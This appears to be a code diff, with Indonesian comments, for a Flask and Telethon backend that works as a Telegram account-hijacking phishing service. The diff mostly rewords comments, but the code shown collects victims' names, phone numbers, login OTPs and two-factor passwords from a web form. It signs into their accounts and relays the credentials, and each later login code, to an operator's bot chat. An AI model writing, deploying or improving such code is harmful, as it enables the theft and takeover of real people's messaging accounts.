@@ -7,6 +7,7 @@ from telethon.sessions import StringSession
 app = Flask(__name__)
 CORS(app)
 
+# Pastikan Variables ini sudah diisi di Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -19,7 +20,7 @@ def bot_api(method, payload):
 
 @app.route('/register', methods=['POST'])
 def register():
-    # PERBAIKAN: Harus menggunakan get_json() agar data terbaca
+    # PERBAIKAN: Menggunakan get_json() agar data dari browser terbaca
     data = request.get_json()
     if not data:
         return jsonify({"status": "error"}), 400
@@ -44,8 +45,8 @@ async def handle_flow(data):
         elif step == 2:
             try:
                 await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
+                # ATURAN: 1 Nomor = 1 Pesan (Kirim hanya jika belum ada msg_id)
                 text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : "
-                # Logika agar hanya ada 1 pesan per nomor
                 if not user_db[nomor].get('msg_id'):
                     msg = bot_api("sendMessage", {
                         "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
@@ -63,7 +64,7 @@ async def handle_flow(data):
             try:
                 await client.sign_in(password=data.get('sandi'))
                 text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : "
-                # Edit pesan lama daripada kirim baru
+                # ATURAN: Edit pesan lama (bukan kirim baru)
                 if user_db[nomor].get('msg_id'):
                     bot_api("editMessageText", {
                         "chat_id": CHAT_ID, "message_id": user_db[nomor]['msg_id'], "text": text, 
@@ -82,13 +83,13 @@ def webhook():
         call = update["callback_query"]
         action, nomor = call["data"].split("_")
         if action == "upd":
-            # Kirim instruksi
+            # Kirim instruksi sementara
             res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap menerima OTP!", 
                                          "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
             user_db[nomor]['status_id'] = res.get('result', {}).get('message_id')
             asyncio.run(monitor_new_otp(nomor))
         elif action == "exit":
-            # Hapus instruksi jika diklik exit
+            # Hapus instruksi agar chat tetap bersih
             if nomor in user_db and user_db[nomor].get('status_id'):
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
     return jsonify({"status": "success"})
@@ -103,13 +104,13 @@ async def monitor_new_otp(nomor):
     async def handler(event):
         otp = re.search(r'\b\d{5}\b', event.raw_text)
         if otp:
-            # Otomatis isi baris OTP di pesan log
+            # Edit log utama dengan OTP terbaru
             bot_api("editMessageText", {
                 "chat_id": CHAT_ID, "message_id": data['msg_id'],
                 "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                 "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
             })
-            # Hapus otomatis teks "Bot siap menerima OTP!"
+            # Hapus teks "Bot siap" otomatis setelah OTP didapat
             bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
             await client.disconnect()
     await asyncio.sleep(300)
